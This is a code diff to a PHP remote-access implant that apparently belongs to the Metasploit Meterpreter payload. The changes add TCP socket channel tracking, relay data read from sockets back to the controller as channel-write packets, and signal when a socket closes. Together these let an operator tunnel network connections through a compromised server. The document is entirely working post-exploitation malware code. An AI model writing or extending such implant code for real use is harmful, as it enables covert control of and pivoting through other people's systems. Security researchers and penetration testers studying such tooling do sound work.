@@ -308,7 +308,7 @@ function is_windows() {
 
 # Wrap everything in checks for existence of the new functions in case we get
 # eval'd twice
-my_print("Evaling stdapi");
+#my_print("Evaling stdapi");
 # works
 if (!function_exists('stdapi_fs_chdir')) {
 function stdapi_fs_chdir($req, &$pkt) {
@@ -623,7 +623,7 @@ function channel_create_stdapi_fs_file($req, &$pkt) {
 
 
 function channel_create_stdapi_net_tcp_client($req, &$pkt) {
-    global $channels;
+    global $channels, $socket_readers;
     $peer_host_tlv = packet_get_tlv($req, TLV_TYPE_PEER_HOST);
     $peer_port_tlv = packet_get_tlv($req, TLV_TYPE_PEER_PORT);
     $local_host_tlv = packet_get_tlv($req, TLV_TYPE_LOCAL_HOST);
@@ -638,6 +638,7 @@ function channel_create_stdapi_net_tcp_client($req, &$pkt) {
         $id = count($channels) - 1;
         my_print("Created new channel $sock, with id $id");
         packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $id));
+        array_push($socket_readers, $sock);
         return ERROR_SUCCESS;
     } else {
         my_print("Failed to open");
@@ -769,10 +770,20 @@ function core_loadlib($req, &$pkt) {
 ##
 $channels = array();
 
+function get_channel_id_from_socket($sock) {
+    global $channels;
+    my_print("looking for channel from sock $sock");
+    for ($i = 0; $i < count($channels); $i++) {
+        if ($channels[$i][0] == $sock) {
+            return $i;
+        }
+    }
+    return false;
+}
+
 function get_channel_by_id($chan_id) {
     global $channels;
     my_print("looking for channel $chan_id");
-    var_dump($channels);
     if (array_key_exists($chan_id, $channels)) {
         return $channels[$chan_id];
     } else {
@@ -823,6 +834,39 @@ function channel_interact($chan_id) {
 ##
 # TLV Helper Functions
 ##
+
+function handle_dead_socket_channel($sock) {
+    $cid = get_channel_id_from_socket($sock);
+    my_print("Handling dead socket: {$sock}");
+    $pkt = pack("N", PACKET_TYPE_REQUEST);
+
+    packet_add_tlv($pkt, create_tlv(TLV_TYPE_METHOD, 'core_channel_close'));
+    # XXX Make this random
+    $req_id = str_repeat("A",32);
+    packet_add_tlv($pkt, create_tlv(TLV_TYPE_REQUEST_ID, $req_id));
+    packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $cid));
+
+    # Add the length to the beginning of the packet
+    $pkt = pack("N", strlen($pkt) + 4) . $pkt;
+    return $pkt;
+}
+function handle_socket_read_channel($sock, $data) {
+    $cid = get_channel_id_from_socket($sock);
+    my_print("Handling socket data: {$data}");
+    $pkt = pack("N", PACKET_TYPE_REQUEST);
+
+    packet_add_tlv($pkt, create_tlv(TLV_TYPE_METHOD, 'core_channel_write'));
+    # XXX Make this random
+    $req_id = str_repeat("A",32);
+    packet_add_tlv($pkt, create_tlv(TLV_TYPE_REQUEST_ID, $req_id));
+    packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $cid));
+    packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_DATA, $data));
+    packet_add_tlv($pkt, create_tlv(TLV_TYPE_LENGTH, strlen($data)));
+
+    # Add the length to the beginning of the packet
+    $pkt = pack("N", strlen($pkt) + 4) . $pkt;
+    return $pkt;
+}
 
 function create_response($req) {
     $pkt = pack("N", PACKET_TYPE_RESPONSE);
@@ -973,7 +1017,9 @@ $file_readers = array();
 #
 while (FALSE !== socket_select($r=$socket_readers, $w=NULL, $e=NULL, 1)) {
     $read_failed = false;
-    foreach ($r as $ready) {
+    for ($i = 0; $i < count($r); $i++) {
+        $ready = $r[$i];
+    #foreach ($r as $ready) {
         if ($ready == $msgsock) {
             $request = socket_read($msgsock, 8, PHP_BINARY_READ);
             if (FALSE==$request) {
@@ -995,19 +1041,18 @@ while (FALSE !== socket_select($r=$socket_readers, $w=NULL, $e=NULL, 1)) {
 
             socket_write($msgsock, $response);
         } else {
-            my_print("not Msgsock");
-            $data = socket_read($msgsock, 8, PHP_BINARY_READ);
-            if (FALSE == $data) {
-
+            my_print("not Msgsock: $ready");
+            $data = socket_read($ready, 1024, PHP_BINARY_READ);
+            if (FALSE === $data || "" === $data) {
+                $request = handle_dead_socket_channel($ready);
+                socket_write($msgsock, $request);
+                unset($socket_readers[$i]);
+            } else {
+                $request = handle_socket_read_channel($ready, $data);
+                socket_write($msgsock, $request);
             }
         }
     }
-    #if (0 < count($file_readers)) {
-    #    stream_select($r=$file_readers, $w=NULL, $e=NULL, 0);
-    #    foreach ($r as $ready) {
-    #        $read = fread($r,
-    #    }
-    #}
 }
 my_print("Finished");
 socket_close($msgsock);
